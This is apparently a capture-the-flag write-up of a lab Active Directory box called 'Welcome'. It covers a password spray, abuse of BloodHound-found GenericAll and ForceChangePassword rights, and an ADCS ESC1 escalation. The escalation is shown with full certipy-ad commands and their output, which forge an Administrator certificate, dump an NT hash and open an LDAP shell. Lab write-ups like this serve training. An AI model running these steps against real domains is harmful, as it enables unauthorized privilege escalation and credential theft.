---
title: "Welcome (HackSmarter AD)"
date: 2026-11-16T10:00:00-08:00
draft: false
tags: ["hacksmarter", "windows", "active-directory", "adcs", "esc1", "bloodhound", "privilege-escalation", "oscp", "writeup"]
categories: ["Writeups"]
cover:
  image: "cover.jpg"
  relative: true
  alt: "Welcome Start Guide"
ShowToc: true
TocOpen: false
summary: "A HackSmarter Active Directory box. We phish our way in with a single set of creds, spray a default password to pick up a second user, abuse HR GenericAll and ForceChangePassword through BloodHound, then ride an ESC1 certificate template to Domain Admin."
---

Box name - Welcome

Difficulty - Easy

Objective:

You are a member of the Hack Smarter Red Team. During a phishing engagement, you were able to retrieve credentials for the client's Active Directory environment. Use these credentials to enumerate the environment, elevate your privileges, and demonstrate impact for the client.

---

## Initial Enumeration

RustScan results

```
Open 10.1.90.1:53
Open 10.1.90.1:88
Open 10.1.90.1:135
Open 10.1.90.1:139
Open 10.1.90.1:389
Open 10.1.90.1:445
Open 10.1.90.1:464
Open 10.1.90.1:593
Open 10.1.90.1:636
Open 10.1.90.1:3268
Open 10.1.90.1:3269
Open 10.1.90.1:3389
Open 10.1.90.1:5985
Open 10.1.90.1:9389
Open 10.1.90.1:49664
Open 10.1.90.1:49667
Open 10.1.90.1:49681
Open 10.1.90.1:49685
Open 10.1.90.1:49718
Open 10.1.90.1:49737
```

Starting Credentials:

```
e.hills:Il0vemyj0b2025!
```

![welcome-00](welcome-00.png)

Our user can read the share “Human Resources”.

![welcome-01](welcome-01.png)

Welcome Start Guide requires password → Found in user e.hills smb share.

![welcome-02](welcome-02.png)

Password for file “humanresources”.

![welcome-03](welcome-03.png)

Default passwords [REDACTED]

Looks like a potential password spray.

LDAP doesn’t seem to be working, how can we find more users?

WinRM and RDP look like they don’t work for initial user.

![welcome-04](welcome-04.png)

We get a list of users with LDAP!

![welcome-05](welcome-05.png)

---

## Password Spray

One of our users has a login ability with the sprayed credentials.

![welcome-06](welcome-06.png)

a.harris:[REDACTED]

![welcome-07](welcome-07.png)

Our user has the same shares as initial credentials.

---

## BloodHound

We did bloodhound collection with our user `a.harris` and found our users has GenericAll through the HR department for

![welcome-08](welcome-08.png)

We saw the `I.PARK` user has ForceChangePassword over two SVC users, `SVC_WEB` and `SVC_CA`.

![welcome-09](welcome-09.png)

---

## Privilege Escalation

We were able to successfully change the password of that user. For future reference make sure in bloodyAD syntax that you use proper capitalization on DC01, Host, etc.

![welcome-10](welcome-10.png)

Let’s check that user’s credentials.

![welcome-11](welcome-11.png)

That worked!

![welcome-12](welcome-12.png)

These users don’t have any additional shares to look through.

---

## ADCS (ESC1)

![welcome-13](welcome-13.png)

ESC1 and ESC17.

![welcome-14](welcome-14.png)

Template = Welcome-Template

Should we try to get this user with an ESC1 certificate?

![welcome-15](welcome-15.png)

![welcome-16](welcome-16.png)

```
certipy-ad req -u 'svc_ca@WELCOME.LOCAL' -p 'Password123!' -dc-ip 10.1.90.1 -target 10.1.90.1 -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'Administrator@WELCOME.LOCAL' -sid 'S-1-5-21-141921413-1529318470-1830575104-500'

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@WELCOME.LOCAL'
[*] Certificate object SID is 'S-1-5-21-141921413-1529318470-1830575104-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

![welcome-17](welcome-17.png)

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.90.1 -domain WELCOME.LOCAL -username Administrator
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@WELCOME.LOCAL'
[*]     SAN URL SID: 'S-1-5-21-141921413-1529318470-1830575104-500'
[*] Using principal: 'administrator@welcome.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a
```

![welcome-18](welcome-18.png)

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.90.1 -domain WELCOME.LOCAL -username Administrator -ldap-shell
```

---

## Domain Admin

![welcome-19](welcome-19.png)

GG. <3
